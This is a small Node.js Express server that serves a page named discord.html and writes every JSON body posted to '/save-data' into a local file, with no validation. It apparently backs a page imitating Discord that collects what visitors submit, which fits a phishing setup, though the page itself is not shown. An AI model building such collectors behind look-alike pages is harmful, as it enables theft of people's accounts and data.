const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const app = express();
const port = 4200;

app.use(bodyParser.json());

app.use(express.static("public"));

app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "public", "discord.html"));
});

app.post("/save-data", (req, res) => {
	const data = req.body;
	const filePath = path.join(__dirname, "meow.json");

	fs.readFile(filePath, "utf8", (err, fileData) => {
		let jsonData = [];

		if (!err && fileData) {
			jsonData = JSON.parse(fileData);
		}
		jsonData.push(data);
		fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), "utf8", (err) => {
			if (err) {
				console.error("Error writing to file:", err);
				res.status(500).send("Error saving data");
			} else {
				res.send("Data saved successfully");
			}
		});
	});
});

app.listen(port, () => {
	console.log(`✅ Server is running on http://localhost:${port}`);
});
